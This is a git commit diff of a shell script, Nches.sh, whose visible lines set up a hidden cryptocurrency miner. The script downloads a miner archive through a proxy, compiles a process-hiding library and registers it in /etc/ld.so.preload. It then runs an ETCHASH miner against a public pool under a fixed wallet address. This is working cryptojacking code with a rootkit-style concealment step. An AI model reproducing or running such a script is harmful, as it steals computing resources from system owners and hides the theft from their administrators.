11bf4b7d87c977a39d05739b031b568821da75a4
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-04-10 18:31:46 +0700

    Update Nches.sh

--- Nches.sh
+++ Nches.sh
@@ -40,8 +40,12 @@ chmod +x bezzHash
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
+
 make
+
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
 ./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
